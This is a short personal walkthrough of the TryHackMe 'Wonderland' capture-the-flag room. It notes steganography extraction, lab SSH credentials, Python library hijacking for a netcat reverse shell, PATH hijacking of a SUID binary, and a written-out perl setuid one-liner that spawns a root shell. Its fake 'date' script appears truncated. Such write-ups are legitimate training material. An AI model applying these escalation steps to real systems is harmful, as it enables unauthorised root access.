---
title: Wonderland
date: 2022-09-19 18:32:00 -0500
categories: [Walkthrough, Tryhackme, CTF]
tags: [stegseek, sudo, PATH, Linux]
---

Fall down the rabbit hole and enter wonderland.

* * *

## Notes

- `stegseek -sf index.jpeg `
- follow the r/a/b/b/i/t which is a hint for the directories i found with ferroxbuster

then viewing source gets us to the ssh logins for alice:HowDothTheLittleCrocodileImproveHisShiningTail

- `sudo -l`

the python script is importing 'random', however random isnt calling a path so we can create a random.py for the script to import with a nc mkfifo calling back to a listener on our attacker

Checking teaParty which has SUID set as hatter in rabbits dir with ghidra we see it is running date and not calling full path. We can take advantage of this by creating a script `date` in `tmp` and adding tmp tot he path. 

date

```
#!/bin/sh

-i
```

than `export PATH=/tmp:$PATH`

running `./teaParty` gets us hatters shell

hatter creds

hatter:WhyIsARavenLikeAWritingDesk?

running linpeas eariar we found perl has setuid capabilities. GTFO bins get us root

`perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

* * * 

## user.txt?

/root

* * * 

## root.txt?

/home/alice

* * * 

Source: <https://tryhackme.com/room/wonderland>